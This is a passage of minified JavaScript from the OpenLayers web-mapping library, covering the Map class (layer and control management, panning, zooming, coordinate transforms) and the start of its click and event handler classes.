"EPSG:102113","EPSG:102100"],f=["CRS:84","urn:ogc:def:crs:EPSG:6.6:4326","EPSG:4326"],g;for(g=e.length-1;0&lt;=g;--g)c(e[g],f);for(g=f.length-1;0&lt;=g;--g)c(f[g],e)})();OpenLayers.Map=OpenLayers.Class({Z_INDEX_BASE:{BaseLayer:100,Overlay:325,Feature:725,Popup:750,Control:1E3},id:null,fractionalZoom:!1,events:null,allOverlays:!1,div:null,dragging:!1,size:null,viewPortDiv:null,layerContainerOrigin:null,layerContainerDiv:null,layers:null,controls:null,popups:null,baseLayer:null,center:null,resolution:null,zoom:0,panRatio:1.5,options:null,tileSize:null,projection:"EPSG:4326",units:null,resolutions:null,maxResolution:null,minResolution:null,maxScale:null,minScale:null, maxExtent:null,minExtent:null,restrictedExtent:null,numZoomLevels:16,theme:null,displayProjection:null,fallThrough:!1,autoUpdateSize:!0,eventListeners:null,panTween:null,panMethod:OpenLayers.Easing.Expo.easeOut,panDuration:50,zoomTween:null,zoomMethod:OpenLayers.Easing.Quad.easeOut,zoomDuration:20,paddingForPopups:null,layerContainerOriginPx:null,minPx:null,maxPx:null,initialize:function(a,b){1===arguments.length&amp;&amp;"object"===typeof a&amp;&amp;(a=(b=a)&amp;&amp;b.div);this.tileSize=new OpenLayers.Size(OpenLayers.Map.TILE_WIDTH, OpenLayers.Map.TILE_HEIGHT);this.paddingForPopups=new OpenLayers.Bounds(15,15,15,15);this.theme=OpenLayers._getScriptLocation()+"theme/default/style.css";this.options=OpenLayers.Util.extend({},b);OpenLayers.Util.extend(this,b);OpenLayers.Util.applyDefaults(this,OpenLayers.Projection.defaults[this.projection instanceof OpenLayers.Projection?this.projection.projCode:this.projection]);!this.maxExtent||this.maxExtent instanceof OpenLayers.Bounds||(this.maxExtent=new OpenLayers.Bounds(this.maxExtent)); !this.minExtent||this.minExtent instanceof OpenLayers.Bounds||(this.minExtent=new OpenLayers.Bounds(this.minExtent));!this.restrictedExtent||this.restrictedExtent instanceof OpenLayers.Bounds||(this.restrictedExtent=new OpenLayers.Bounds(this.restrictedExtent));!this.center||this.center instanceof OpenLayers.LonLat||(this.center=new OpenLayers.LonLat(this.center));this.layers=[];this.id=OpenLayers.Util.createUniqueID("OpenLayers.Map_");this.div=OpenLayers.Util.getElement(a);this.div||(this.div=document.createElement("div"), this.div.style.height="1px",this.div.style.width="1px");OpenLayers.Element.addClass(this.div,"olMap");var c=this.id+"_OpenLayers_ViewPort";this.viewPortDiv=OpenLayers.Util.createDiv(c,null,null,null,"relative",null,"hidden");this.viewPortDiv.style.width="100%";this.viewPortDiv.style.height="100%";this.viewPortDiv.className="olMapViewport";this.div.appendChild(this.viewPortDiv);this.events=new OpenLayers.Events(this,this.viewPortDiv,null,this.fallThrough,{includeXY:!0});OpenLayers.TileManager&amp;&amp;null!== this.tileManager&amp;&amp;(this.tileManager instanceof OpenLayers.TileManager||(this.tileManager=new OpenLayers.TileManager(this.tileManager)),this.tileManager.addMap(this));c=this.id+"_OpenLayers_Container";this.layerContainerDiv=OpenLayers.Util.createDiv(c);this.layerContainerDiv.style.zIndex=this.Z_INDEX_BASE.Popup-1;this.layerContainerOriginPx={x:0,y:0};this.applyTransform();this.viewPortDiv.appendChild(this.layerContainerDiv);this.updateSize();if(this.eventListeners instanceof Object)this.events.on(this.eventListeners); !0===this.autoUpdateSize&amp;&amp;(this.updateSizeDestroy=OpenLayers.Function.bind(this.updateSize,this),OpenLayers.Event.observe(window,"resize",this.updateSizeDestroy));if(this.theme){for(var c=!0,d=document.getElementsByTagName("link"),e=0,f=d.length;e&lt;f;++e)if(OpenLayers.Util.isEquivalentUrl(d.item(e).href,this.theme)){c=!1;break}c&amp;&amp;(c=document.createElement("link"),c.setAttribute("rel","stylesheet"),c.setAttribute("type","text/css"),c.setAttribute("href",this.theme),document.getElementsByTagName("head")[0].appendChild(c))}null== this.controls&amp;&amp;(this.controls=[],null!=OpenLayers.Control&amp;&amp;(OpenLayers.Control.Navigation?this.controls.push(new OpenLayers.Control.Navigation):OpenLayers.Control.TouchNavigation&amp;&amp;this.controls.push(new OpenLayers.Control.TouchNavigation),OpenLayers.Control.Zoom?this.controls.push(new OpenLayers.Control.Zoom):OpenLayers.Control.PanZoom&amp;&amp;this.controls.push(new OpenLayers.Control.PanZoom),OpenLayers.Control.ArgParser&amp;&amp;this.controls.push(new OpenLayers.Control.ArgParser),OpenLayers.Control.Attribution&amp;&amp; this.controls.push(new OpenLayers.Control.Attribution)));e=0;for(f=this.controls.length;e&lt;f;e++)this.addControlToMap(this.controls[e]);this.popups=[];this.unloadDestroy=OpenLayers.Function.bind(this.destroy,this);OpenLayers.Event.observe(window,"unload",this.unloadDestroy);b&amp;&amp;b.layers&amp;&amp;(delete this.center,delete this.zoom,this.addLayers(b.layers),b.center&amp;&amp;!this.getCenter()&amp;&amp;this.setCenter(b.center,b.zoom));this.panMethod&amp;&amp;(this.panTween=new OpenLayers.Tween(this.panMethod));this.zoomMethod&amp;&amp;this.applyTransform.transform&amp;&amp; (this.zoomTween=new OpenLayers.Tween(this.zoomMethod))},getViewport:function(){return this.viewPortDiv},render:function(a){this.div=OpenLayers.Util.getElement(a);OpenLayers.Element.addClass(this.div,"olMap");this.viewPortDiv.parentNode.removeChild(this.viewPortDiv);this.div.appendChild(this.viewPortDiv);this.updateSize()},unloadDestroy:null,updateSizeDestroy:null,destroy:function(){if(!this.unloadDestroy)return!1;this.panTween&amp;&amp;(this.panTween.stop(),this.panTween=null);this.zoomTween&amp;&amp;(this.zoomTween.stop(), this.zoomTween=null);OpenLayers.Event.stopObserving(window,"unload",this.unloadDestroy);this.unloadDestroy=null;this.updateSizeDestroy&amp;&amp;OpenLayers.Event.stopObserving(window,"resize",this.updateSizeDestroy);this.paddingForPopups=null;if(null!=this.controls){for(var a=this.controls.length-1;0&lt;=a;--a)this.controls[a].destroy();this.controls=null}if(null!=this.layers){for(a=this.layers.length-1;0&lt;=a;--a)this.layers[a].destroy(!1);this.layers=null}this.viewPortDiv&amp;&amp;this.viewPortDiv.parentNode&amp;&amp;this.viewPortDiv.parentNode.removeChild(this.viewPortDiv); this.viewPortDiv=null;this.tileManager&amp;&amp;(this.tileManager.removeMap(this),this.tileManager=null);this.eventListeners&amp;&amp;(this.events.un(this.eventListeners),this.eventListeners=null);this.events.destroy();this.options=this.events=null},setOptions:function(a){var b=this.minPx&amp;&amp;a.restrictedExtent!=this.restrictedExtent;OpenLayers.Util.extend(this,a);b&amp;&amp;this.moveTo(this.getCachedCenter(),this.zoom,{forceZoomChange:!0})},getTileSize:function(){return this.tileSize},getBy:function(a,b,c){var d="function"== typeof c.test;return OpenLayers.Array.filter(this[a],function(a){return a[b]==c||d&amp;&amp;c.test(a[b])})},getLayersBy:function(a,b){return this.getBy("layers",a,b)},getLayersByName:function(a){return this.getLayersBy("name",a)},getLayersByClass:function(a){return this.getLayersBy("CLASS_NAME",a)},getControlsBy:function(a,b){return this.getBy("controls",a,b)},getControlsByClass:function(a){return this.getControlsBy("CLASS_NAME",a)},getLayer:function(a){for(var b=null,c=0,d=this.layers.length;c&lt;d;c++){var e= this.layers[c];if(e.id==a){b=e;break}}return b},setLayerZIndex:function(a,b){a.setZIndex(this.Z_INDEX_BASE[a.isBaseLayer?"BaseLayer":"Overlay"]+5*b)},resetLayersZIndex:function(){for(var a=0,b=this.layers.length;a&lt;b;a++)this.setLayerZIndex(this.layers[a],a)},addLayer:function(a){for(var b=0,c=this.layers.length;b&lt;c;b++)if(this.layers[b]==a)return!1;if(!1===this.events.triggerEvent("preaddlayer",{layer:a}))return!1;this.allOverlays&amp;&amp;(a.isBaseLayer=!1);a.div.className="olLayerDiv";a.div.style.overflow= "";this.setLayerZIndex(a,this.layers.length);a.isFixed?this.viewPortDiv.appendChild(a.div):this.layerContainerDiv.appendChild(a.div);this.layers.push(a);a.setMap(this);a.isBaseLayer||this.allOverlays&amp;&amp;!this.baseLayer?null==this.baseLayer?this.setBaseLayer(a):a.setVisibility(!1):a.redraw();this.events.triggerEvent("addlayer",{layer:a});a.events.triggerEvent("added",{map:this,layer:a});a.afterAdd();return!0},addLayers:function(a){for(var b=0,c=a.length;b&lt;c;b++)this.addLayer(a[b])},removeLayer:function(a, b){if(!1!==this.events.triggerEvent("preremovelayer",{layer:a})){null==b&amp;&amp;(b=!0);a.isFixed?this.viewPortDiv.removeChild(a.div):this.layerContainerDiv.removeChild(a.div);OpenLayers.Util.removeItem(this.layers,a);a.removeMap(this);a.map=null;if(this.baseLayer==a&amp;&amp;(this.baseLayer=null,b))for(var c=0,d=this.layers.length;c&lt;d;c++){var e=this.layers[c];if(e.isBaseLayer||this.allOverlays){this.setBaseLayer(e);break}}this.resetLayersZIndex();this.events.triggerEvent("removelayer",{layer:a});a.events.triggerEvent("removed", {map:this,layer:a})}},getNumLayers:function(){return this.layers.length},getLayerIndex:function(a){return OpenLayers.Util.indexOf(this.layers,a)},setLayerIndex:function(a,b){var c=this.getLayerIndex(a);0>b?b=0:b>this.layers.length&amp;&amp;(b=this.layers.length);if(c!=b){this.layers.splice(c,1);this.layers.splice(b,0,a);for(var c=0,d=this.layers.length;c&lt;d;c++)this.setLayerZIndex(this.layers[c],c);this.events.triggerEvent("changelayer",{layer:a,property:"order"});this.allOverlays&amp;&amp;(0===b?this.setBaseLayer(a): this.baseLayer!==this.layers[0]&amp;&amp;this.setBaseLayer(this.layers[0]))}},raiseLayer:function(a,b){var c=this.getLayerIndex(a)+b;this.setLayerIndex(a,c)},setBaseLayer:function(a){if(a!=this.baseLayer&amp;&amp;-1!=OpenLayers.Util.indexOf(this.layers,a)){var b=this.getCachedCenter(),c=OpenLayers.Util.getResolutionFromScale(this.getScale(),a.units);null==this.baseLayer||this.allOverlays||this.baseLayer.setVisibility(!1);this.baseLayer=a;if(!this.allOverlays||this.baseLayer.visibility)this.baseLayer.setVisibility(!0), !1===this.baseLayer.inRange&amp;&amp;this.baseLayer.redraw();null!=b&amp;&amp;(a=this.getZoomForResolution(c||this.resolution,!0),this.setCenter(b,a,!1,!0));this.events.triggerEvent("changebaselayer",{layer:this.baseLayer})}},addControl:function(a,b){this.controls.push(a);this.addControlToMap(a,b)},addControls:function(a,b){for(var c=1===arguments.length?[]:b,d=0,e=a.length;d&lt;e;d++)this.addControl(a[d],c[d]?c[d]:null)},addControlToMap:function(a,b){a.outsideViewport=null!=a.div;this.displayProjection&amp;&amp;!a.displayProjection&amp;&amp; (a.displayProjection=this.displayProjection);a.setMap(this);var c=a.draw(b);c&amp;&amp;!a.outsideViewport&amp;&amp;(c.style.zIndex=this.Z_INDEX_BASE.Control+this.controls.length,this.viewPortDiv.appendChild(c));a.autoActivate&amp;&amp;a.activate()},getControl:function(a){for(var b=null,c=0,d=this.controls.length;c&lt;d;c++){var e=this.controls[c];if(e.id==a){b=e;break}}return b},removeControl:function(a){a&amp;&amp;a==this.getControl(a.id)&amp;&amp;(a.div&amp;&amp;a.div.parentNode==this.viewPortDiv&amp;&amp;this.viewPortDiv.removeChild(a.div),OpenLayers.Util.removeItem(this.controls, a))},addPopup:function(a,b){if(b)for(var c=this.popups.length-1;0&lt;=c;--c)this.removePopup(this.popups[c]);a.map=this;this.popups.push(a);if(c=a.draw())c.style.zIndex=this.Z_INDEX_BASE.Popup+this.popups.length,this.layerContainerDiv.appendChild(c)},removePopup:function(a){OpenLayers.Util.removeItem(this.popups,a);if(a.div)try{this.layerContainerDiv.removeChild(a.div)}catch(b){}a.map=null},getSize:function(){var a=null;null!=this.size&amp;&amp;(a=this.size.clone());return a},updateSize:function(){var a=this.getCurrentSize(); if(a&amp;&amp;!isNaN(a.h)&amp;&amp;!isNaN(a.w)){this.events.clearMouseCache();var b=this.getSize();null==b&amp;&amp;(this.size=b=a);if(!a.equals(b)){this.size=a;a=0;for(b=this.layers.length;a&lt;b;a++)this.layers[a].onMapResize();a=this.getCachedCenter();null!=this.baseLayer&amp;&amp;null!=a&amp;&amp;(b=this.getZoom(),this.zoom=null,this.setCenter(a,b))}}this.events.triggerEvent("updatesize")},getCurrentSize:function(){var a=new OpenLayers.Size(this.div.clientWidth,this.div.clientHeight);if(0==a.w&amp;&amp;0==a.h||isNaN(a.w)&amp;&amp;isNaN(a.h))a.w=this.div.offsetWidth, a.h=this.div.offsetHeight;if(0==a.w&amp;&amp;0==a.h||isNaN(a.w)&amp;&amp;isNaN(a.h))a.w=parseInt(this.div.style.width),a.h=parseInt(this.div.style.height);return a},calculateBounds:function(a,b){var c=null;null==a&amp;&amp;(a=this.getCachedCenter());null==b&amp;&amp;(b=this.getResolution());if(null!=a&amp;&amp;null!=b)var c=this.size.w*b/2,d=this.size.h*b/2,c=new OpenLayers.Bounds(a.lon-c,a.lat-d,a.lon+c,a.lat+d);return c},getCenter:function(){var a=null,b=this.getCachedCenter();b&amp;&amp;(a=b.clone());return a},getCachedCenter:function(){!this.center&amp;&amp; this.size&amp;&amp;(this.center=this.getLonLatFromViewPortPx({x:this.size.w/2,y:this.size.h/2}));return this.center},getZoom:function(){return this.zoom},pan:function(a,b,c){c=OpenLayers.Util.applyDefaults(c,{animate:!0,dragging:!1});if(c.dragging)0==a&amp;&amp;0==b||this.moveByPx(a,b);else{var d=this.getViewPortPxFromLonLat(this.getCachedCenter());a=d.add(a,b);if(this.dragging||!a.equals(d))d=this.getLonLatFromViewPortPx(a),c.animate?this.panTo(d):(this.moveTo(d),this.dragging&amp;&amp;(this.dragging=!1,this.events.triggerEvent("moveend")))}}, panTo:function(a){if(this.panTween&amp;&amp;this.getExtent().scale(this.panRatio).containsLonLat(a)){var b=this.getCachedCenter();if(!a.equals(b)){var b=this.getPixelFromLonLat(b),c=this.getPixelFromLonLat(a),d=0,e=0;this.panTween.start({x:0,y:0},{x:c.x-b.x,y:c.y-b.y},this.panDuration,{callbacks:{eachStep:OpenLayers.Function.bind(function(a){this.moveByPx(a.x-d,a.y-e);d=Math.round(a.x);e=Math.round(a.y)},this),done:OpenLayers.Function.bind(function(b){this.moveTo(a);this.dragging=!1;this.events.triggerEvent("moveend")}, this)}})}}else this.setCenter(a)},setCenter:function(a,b,c,d){this.panTween&amp;&amp;this.panTween.stop();this.zoomTween&amp;&amp;this.zoomTween.stop();this.moveTo(a,b,{dragging:c,forceZoomChange:d})},moveByPx:function(a,b){var c=this.size.w/2,d=this.size.h/2,e=c+a,f=d+b,g=this.baseLayer.wrapDateLine,h=0,k=0;this.restrictedExtent&amp;&amp;(h=c,k=d,g=!1);a=g||e&lt;=this.maxPx.x-h&amp;&amp;e>=this.minPx.x+h?Math.round(a):0;b=f&lt;=this.maxPx.y-k&amp;&amp;f>=this.minPx.y+k?Math.round(b):0;if(a||b){this.dragging||(this.dragging=!0,this.events.triggerEvent("movestart")); this.center=null;a&amp;&amp;(this.layerContainerOriginPx.x-=a,this.minPx.x-=a,this.maxPx.x-=a);b&amp;&amp;(this.layerContainerOriginPx.y-=b,this.minPx.y-=b,this.maxPx.y-=b);this.applyTransform();d=0;for(e=this.layers.length;d&lt;e;++d)c=this.layers[d],c.visibility&amp;&amp;(c===this.baseLayer||c.inRange)&amp;&amp;(c.moveByPx(a,b),c.events.triggerEvent("move"));this.events.triggerEvent("move")}},adjustZoom:function(a){if(this.baseLayer&amp;&amp;this.baseLayer.wrapDateLine){var b=this.baseLayer.resolutions,c=this.getMaxExtent().getWidth()/this.size.w; if(this.getResolutionForZoom(a)>c)if(this.fractionalZoom)a=this.getZoomForResolution(c);else for(var d=a|0,e=b.length;d&lt;e;++d)if(b[d]&lt;=c){a=d;break}}return a},getMinZoom:function(){return this.adjustZoom(0)},moveTo:function(a,b,c){null==a||a instanceof OpenLayers.LonLat||(a=new OpenLayers.LonLat(a));c||(c={});null!=b&amp;&amp;(b=parseFloat(b),this.fractionalZoom||(b=Math.round(b)));var d=b;b=this.adjustZoom(b);b!==d&amp;&amp;(a=this.getCenter());var d=c.dragging||this.dragging,e=c.forceZoomChange;this.getCachedCenter()|| this.isValidLonLat(a)||(a=this.maxExtent.getCenterLonLat(),this.center=a.clone());if(null!=this.restrictedExtent){null==a&amp;&amp;(a=this.center);null==b&amp;&amp;(b=this.getZoom());var f=this.getResolutionForZoom(b),f=this.calculateBounds(a,f);if(!this.restrictedExtent.containsBounds(f)){var g=this.restrictedExtent.getCenterLonLat();f.getWidth()>this.restrictedExtent.getWidth()?a=new OpenLayers.LonLat(g.lon,a.lat):f.left&lt;this.restrictedExtent.left?a=a.add(this.restrictedExtent.left-f.left,0):f.right>this.restrictedExtent.right&amp;&amp; (a=a.add(this.restrictedExtent.right-f.right,0));f.getHeight()>this.restrictedExtent.getHeight()?a=new OpenLayers.LonLat(a.lon,g.lat):f.bottom&lt;this.restrictedExtent.bottom?a=a.add(0,this.restrictedExtent.bottom-f.bottom):f.top>this.restrictedExtent.top&amp;&amp;(a=a.add(0,this.restrictedExtent.top-f.top))}}e=e||this.isValidZoomLevel(b)&amp;&amp;b!=this.getZoom();f=this.isValidLonLat(a)&amp;&amp;!a.equals(this.center);if(e||f||d){d||this.events.triggerEvent("movestart",{zoomChanged:e});f&amp;&amp;(!e&amp;&amp;this.center&amp;&amp;this.centerLayerContainer(a), this.center=a.clone());a=e?this.getResolutionForZoom(b):this.getResolution();if(e||null==this.layerContainerOrigin){this.layerContainerOrigin=this.getCachedCenter();this.layerContainerOriginPx.x=0;this.layerContainerOriginPx.y=0;this.applyTransform();var f=this.getMaxExtent({restricted:!0}),h=f.getCenterLonLat(),g=this.center.lon-h.lon,h=h.lat-this.center.lat,k=Math.round(f.getWidth()/a),l=Math.round(f.getHeight()/a);this.minPx={x:(this.size.w-k)/2-g/a,y:(this.size.h-l)/2-h/a};this.maxPx={x:this.minPx.x+ Math.round(f.getWidth()/a),y:this.minPx.y+Math.round(f.getHeight()/a)}}e&amp;&amp;(this.zoom=b,this.resolution=a);a=this.getExtent();this.baseLayer.visibility&amp;&amp;(this.baseLayer.moveTo(a,e,c.dragging),c.dragging||this.baseLayer.events.triggerEvent("moveend",{zoomChanged:e}));a=this.baseLayer.getExtent();for(b=this.layers.length-1;0&lt;=b;--b)f=this.layers[b],f===this.baseLayer||f.isBaseLayer||(g=f.calculateInRange(),f.inRange!=g&amp;&amp;((f.inRange=g)||f.display(!1),this.events.triggerEvent("changelayer",{layer:f,property:"visibility"})), g&amp;&amp;f.visibility&amp;&amp;(f.moveTo(a,e,c.dragging),c.dragging||f.events.triggerEvent("moveend",{zoomChanged:e})));this.events.triggerEvent("move");d||this.events.triggerEvent("moveend");if(e){b=0;for(c=this.popups.length;b&lt;c;b++)this.popups[b].updatePosition();this.events.triggerEvent("zoomend")}}},centerLayerContainer:function(a){var b=this.getViewPortPxFromLonLat(this.layerContainerOrigin),c=this.getViewPortPxFromLonLat(a);if(null!=b&amp;&amp;null!=c){var d=this.layerContainerOriginPx.x;a=this.layerContainerOriginPx.y; var e=Math.round(b.x-c.x),b=Math.round(b.y-c.y);this.applyTransform(this.layerContainerOriginPx.x=e,this.layerContainerOriginPx.y=b);d-=e;a-=b;this.minPx.x-=d;this.maxPx.x-=d;this.minPx.y-=a;this.maxPx.y-=a}},isValidZoomLevel:function(a){return null!=a&amp;&amp;0&lt;=a&amp;&amp;a&lt;this.getNumZoomLevels()},isValidLonLat:function(a){var b=!1;null!=a&amp;&amp;(b=this.getMaxExtent(),b=b.containsLonLat(a,{worldBounds:this.baseLayer.wrapDateLine&amp;&amp;b}));return b},getProjection:function(){var a=this.getProjectionObject();return a?a.getCode(): null},getProjectionObject:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.projection);return a},getMaxResolution:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.maxResolution);return a},getMaxExtent:function(a){var b=null;a&amp;&amp;a.restricted&amp;&amp;this.restrictedExtent?b=this.restrictedExtent:null!=this.baseLayer&amp;&amp;(b=this.baseLayer.maxExtent);return b},getNumZoomLevels:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.numZoomLevels);return a},getExtent:function(){var a= null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.getExtent());return a},getResolution:function(){var a=null;null!=this.baseLayer?a=this.baseLayer.getResolution():!0===this.allOverlays&amp;&amp;0&lt;this.layers.length&amp;&amp;(a=this.layers[0].getResolution());return a},getUnits:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.units);return a},getScale:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.getResolution(),a=OpenLayers.Util.getScaleFromResolution(a,this.baseLayer.units));return a},getZoomForExtent:function(a, b){var c=null;null!=this.baseLayer&amp;&amp;(c=this.baseLayer.getZoomForExtent(a,b));return c},getResolutionForZoom:function(a){var b=null;this.baseLayer&amp;&amp;(b=this.baseLayer.getResolutionForZoom(a));return b},getZoomForResolution:function(a,b){var c=null;null!=this.baseLayer&amp;&amp;(c=this.baseLayer.getZoomForResolution(a,b));return c},zoomTo:function(a,b){var c=this;if(c.isValidZoomLevel(a))if(c.baseLayer.wrapDateLine&amp;&amp;(a=c.adjustZoom(a)),c.zoomTween){var d=c.getResolution(),e=c.getResolutionForZoom(a),f={scale:1}, d={scale:d/e};c.zoomTween.playing&amp;&amp;c.zoomTween.duration&lt;3*c.zoomDuration?c.zoomTween.finish={scale:c.zoomTween.finish.scale*d.scale}:(b||(e=c.getSize(),b={x:e.w/2,y:e.h/2}),c.zoomTween.start(f,d,c.zoomDuration,{minFrameRate:50,callbacks:{eachStep:function(a){var d=c.layerContainerOriginPx;a=a.scale;c.applyTransform(d.x+((a-1)*(d.x-b.x)|0),d.y+((a-1)*(d.y-b.y)|0),a)},done:function(a){c.applyTransform();a=c.getResolution()/a.scale;var d=c.getZoomForResolution(a,!0);c.moveTo(c.getZoomTargetCenter(b, a),d,!0)}}}))}else f=b?c.getZoomTargetCenter(b,c.getResolutionForZoom(a)):null,c.setCenter(f,a)},zoomIn:function(){this.zoomTo(this.getZoom()+1)},zoomOut:function(){this.zoomTo(this.getZoom()-1)},zoomToExtent:function(a,b){a instanceof OpenLayers.Bounds||(a=new OpenLayers.Bounds(a));var c=a.getCenterLonLat();if(this.baseLayer.wrapDateLine){c=this.getMaxExtent();for(a=a.clone();a.right&lt;a.left;)a.right+=c.getWidth();c=a.getCenterLonLat().wrapDateLine(c)}this.setCenter(c,this.getZoomForExtent(a,b))}, zoomToMaxExtent:function(a){a=this.getMaxExtent({restricted:a?a.restricted:!0});this.zoomToExtent(a)},zoomToScale:function(a,b){var c=OpenLayers.Util.getResolutionFromScale(a,this.baseLayer.units),d=this.size.w*c/2,c=this.size.h*c/2,e=this.getCachedCenter(),d=new OpenLayers.Bounds(e.lon-d,e.lat-c,e.lon+d,e.lat+c);this.zoomToExtent(d,b)},getLonLatFromViewPortPx:function(a){var b=null;null!=this.baseLayer&amp;&amp;(b=this.baseLayer.getLonLatFromViewPortPx(a));return b},getViewPortPxFromLonLat:function(a){var b= null;null!=this.baseLayer&amp;&amp;(b=this.baseLayer.getViewPortPxFromLonLat(a));return b},getZoomTargetCenter:function(a,b){var c=null,d=this.getSize(),e=d.w/2-a.x,d=a.y-d.h/2,f=this.getLonLatFromPixel(a);f&amp;&amp;(c=new OpenLayers.LonLat(f.lon+e*b,f.lat+d*b));return c},getLonLatFromPixel:function(a){return this.getLonLatFromViewPortPx(a)},getPixelFromLonLat:function(a){a=this.getViewPortPxFromLonLat(a);a.x=Math.round(a.x);a.y=Math.round(a.y);return a},getGeodesicPixelSize:function(a){var b=a?this.getLonLatFromPixel(a): this.getCachedCenter()||new OpenLayers.LonLat(0,0),c=this.getResolution();a=b.add(-c/2,0);var d=b.add(c/2,0),e=b.add(0,-c/2),b=b.add(0,c/2),c=new OpenLayers.Projection("EPSG:4326"),f=this.getProjectionObject()||c;f.equals(c)||(a.transform(f,c),d.transform(f,c),e.transform(f,c),b.transform(f,c));return new OpenLayers.Size(OpenLayers.Util.distVincenty(a,d),OpenLayers.Util.distVincenty(e,b))},getViewPortPxFromLayerPx:function(a){var b=null;null!=a&amp;&amp;(b=a.add(this.layerContainerOriginPx.x,this.layerContainerOriginPx.y)); return b},getLayerPxFromViewPortPx:function(a){var b=null;null!=a&amp;&amp;(b=a.add(-this.layerContainerOriginPx.x,-this.layerContainerOriginPx.y),isNaN(b.x)||isNaN(b.y))&amp;&amp;(b=null);return b},getLonLatFromLayerPx:function(a){a=this.getViewPortPxFromLayerPx(a);return this.getLonLatFromViewPortPx(a)},getLayerPxFromLonLat:function(a){a=this.getPixelFromLonLat(a);return this.getLayerPxFromViewPortPx(a)},applyTransform:function(a,b,c){c=c||1;var d=this.layerContainerOriginPx,e=1!==c;a=a||d.x;b=b||d.y;var f=this.layerContainerDiv.style, g=this.applyTransform.transform,h=this.applyTransform.template;if(void 0===g&amp;&amp;(g=OpenLayers.Util.vendorPrefix.style("transform"),this.applyTransform.transform=g)){var k=OpenLayers.Element.getStyle(this.viewPortDiv,OpenLayers.Util.vendorPrefix.css("transform"));k&amp;&amp;"none"===k||(h=["translate3d(",",0) ","scale3d(",",1)"],f[g]=[h[0],"0,0",h[1]].join(""));h&amp;&amp;~f[g].indexOf(h[0])||(h=["translate(",") ","scale(",")"]);this.applyTransform.template=h}null===g||"translate3d("!==h[0]&amp;&amp;!0!==e?(f.left=a+"px",f.top= b+"px",null!==g&amp;&amp;(f[g]="")):(!0===e&amp;&amp;"translate("===h[0]&amp;&amp;(a-=d.x,b-=d.y,f.left=d.x+"px",f.top=d.y+"px"),f[g]=[h[0],a,"px,",b,"px",h[1],h[2],c,",",c,h[3]].join(""))},CLASS_NAME:"OpenLayers.Map"});OpenLayers.Map.TILE_WIDTH=256;OpenLayers.Map.TILE_HEIGHT=256;OpenLayers.Handler=OpenLayers.Class({id:null,control:null,map:null,keyMask:null,active:!1,evt:null,touch:!1,initialize:function(a,b,c){OpenLayers.Util.extend(this,c);this.control=a;this.callbacks=b;(a=this.map||a.map)&amp;&amp;this.setMap(a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},setMap:function(a){this.map=a},checkModifiers:function(a){return null==this.keyMask?!0:((a.shiftKey?OpenLayers.Handler.MOD_SHIFT:0)|(a.ctrlKey?OpenLayers.Handler.MOD_CTRL:0)|(a.altKey?OpenLayers.Handler.MOD_ALT: 0)|(a.metaKey?OpenLayers.Handler.MOD_META:0))==this.keyMask},activate:function(){if(this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.register(a[b],this[a[b]]);return this.active=!0},deactivate:function(){if(!this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.unregister(a[b],this[a[b]]);this.active=this.touch=!1;return!0},startTouch:function(){if(!this.touch){this.touch=!0; for(var a="mousedown mouseup mousemove click dblclick mouseout".split(" "),b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.unregister(a[b],this[a[b]])}},callback:function(a,b){a&amp;&amp;this.callbacks[a]&amp;&amp;this.callbacks[a].apply(this.control,b)},register:function(a,b){this.map.events.registerPriority(a,this,b);this.map.events.registerPriority(a,this,this.setEvent)},unregister:function(a,b){this.map.events.unregister(a,this,b);this.map.events.unregister(a,this,this.setEvent)},setEvent:function(a){this.evt=a;return!0}, destroy:function(){this.deactivate();this.control=this.map=null},CLASS_NAME:"OpenLayers.Handler"});OpenLayers.Handler.MOD_NONE=0;OpenLayers.Handler.MOD_SHIFT=1;OpenLayers.Handler.MOD_CTRL=2;OpenLayers.Handler.MOD_ALT=4;OpenLayers.Handler.MOD_META=8;OpenLayers.Handler.Click=OpenLayers.Class(OpenLayers.Handler,{delay:300,single:!0,"double":!1,pixelTolerance:0,dblclickTolerance:13,stopSingle:!1,stopDouble:!1,timerId:null,down:null,last:null,first:null,rightclickTimerId:null,touchstart:function(a){this.startTouch();this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0},touchmove:function(a){this.last=this.getEventInfo(a);return!0},touchend:function(a){this.down&amp;&amp;(a.xy=this.last.xy,a.lastTouches=this.last.touches,this.handleSingle(a), this.down=null);return!0},mousedown:function(a){this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0},mouseup:function(a){var b=!0;this.checkModifiers(a)&amp;&amp;(this.control.handleRightClicks&amp;&amp;OpenLayers.Event.isRightClick(a))&amp;&amp;(b=this.rightclick(a));return b},rightclick:function(a){if(this.passesTolerance(a)){if(null!=this.rightclickTimerId)return this.clearTimer(),this.callback("dblrightclick",[a]),!this.stopDouble;a=this["double"]?OpenLayers.Util.extend({},a):this.callback("rightclick", [a]);a=OpenLayers.Function.bind(this.delayedRightCall,this,a);this.rightclickTimerId=window.setTimeout(a,this.delay)}return!this.stopSingle},delayedRightCall:function(a){this.rightclickTimerId=null;a&amp;&amp;this.callback("rightclick",[a])},click:function(a){this.last||(this.last=this.getEventInfo(a));this.handleSingle(a);return!this.stopSingle},dblclick:function(a){this.handleDouble(a);return!this.stopDouble},handleDouble:function(a){this.passesDblclickTolerance(a)&amp;&amp;(this["double"]&amp;&amp;this.callback("dblclick", [a]),this.clearTimer())},handleSingle:function(a){this.passesTolerance(a)&amp;&amp;(null!=this.timerId?(this.last.touches&amp;&amp;1===this.last.touches.length&amp;&amp;(this["double"]&amp;&amp;OpenLayers.Event.preventDefault(a),this.handleDouble(a)),this.last.touches&amp;&amp;2===this.last.touches.length||this.clearTimer()):(this.first=this.getEventInfo(a),a=this.single?OpenLayers.Util.extend({},a):null,this.queuePotentialClick(a)))},queuePotentialClick:function(a){this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall, 